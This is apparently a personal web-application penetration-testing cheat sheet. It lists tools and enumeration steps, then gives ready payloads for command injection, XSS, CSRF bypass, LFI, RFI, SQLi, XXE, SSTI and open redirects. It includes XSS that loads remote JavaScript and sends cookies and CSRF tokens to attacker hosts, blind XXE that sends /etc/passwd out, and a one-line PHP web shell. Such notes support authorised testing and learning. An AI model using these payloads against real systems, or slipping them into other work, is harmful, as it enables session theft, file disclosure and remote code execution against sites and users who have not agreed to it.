Tools:
https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi
https://github.com/swisskyrepo/PayloadsAllTheThings
https://crackstation.net/
https://www.dcode.fr/javascript-unobfuscator

Wordlists:
directory-list-lowercase-2.3-medium.txt

Linux Commands:
env

Testing:
Command injection: `;ls` `;cat /etc/passwd`

# Enumeration
Site Map - feroxbuster/burp (feroxbuster egrep "^200" feroxbuster.txt | tr -s " " | cut -d " " -f 6 | anew feroxbuster200s.txt)

# Manual Testing
- Walk the site like a regular user
- Create 2 accounts for testing
- Test `'"><b>Test</b>` add `{7'*7'}` if templates are in use, or `<img src=x>'"${{7*7}}` to test all
-  <b>test</b> all reflected parameters
- Check for robots.txt, security.txt

## XSS
- use confirm over alert
XSS Exploits:
`<script>document.location.href="https://example.com"</script>` redirect
`<img src=x onerror="this.src='https://example.com/xss.js';">` execute remote js
`<script src=https://example.com/xss.js></script>` execute remote js
`<script>fetch('https:example.com/cookie='+document.cookie);</script>`
Steal CSRF
```
var token = document.getElementsById('csrf-token')[0];
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://attacker/?token="+token, true);
xhr.send(null);
```
XSS Payloads:
`<img src=x onerror="alert('XSS')">`

in JS:
`'alert()/*`
Breakout of HTML tags:
`"><script>confirm()</script>`
## File upload
- image: XXE via SVG with SSRF
- documents: XXE via DOCX/XLSX
- zip: param=zip://file.zip%23rce.php - upload a zip file containing a php file
## CSRF
-   Remove the CSRF token from requests
-   Replace the CSRF token with a random value (for example 1)
-   Replace the CSRF token with a random token of the same restraints
-   Leave CSRF Parameter empty
-   Use a CSRF token that has been used before
-   See if you can request a CSRF by executing the call manually and use that token for the request
## LFI
- Null byte termination
- double html encoding
- utf-8 encoding
- /var/log/apache2/access.log
- /etc/passwd
## RFI
- <?php system($_GET['cmd']); ?>
## SQLi
1' or 1=1 --
- test with '"`
## XXE
- XXE to retrieve files
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
- XXE to perform SSRF
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "<http://f2g9j7hhkax.web-attacker.com>">
]>
```
- Blind XXE
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '<http://webattacker.com/?x=%file;>'>">
%eval;
%exfiltrate;
```
- Insert &xxe; entity into every XML element, any can be vulnerable.
- XXE via SVG - save below as .svg file
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM  "file:///etc/hostname" >]>
<foo>&xxe;</foo>
```
- XXE via docx/xlsx
https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/
- Content-type from json to xml

## SSTI

- PoC = RCE
- Test:`${7*7}`
- Identify: `{{7*7}}` resolves = keep testing, fails = not vuln. Twig = `{{7’*7’}}`. Smarty = `A{_comment_}b`. Mako = `${“z”.join{“ab”}}`.
## Open Redirects
- Test Referrer header - host the page below, click the link and see if it redirects back to attacker owned page
```
<html><a href="https://victim.com/login">Click on this link!</a><html>
```
#### Mindmap
![[Pasted image 20221127083625.png]]

#### Email Testing
![[email-testing.png]]

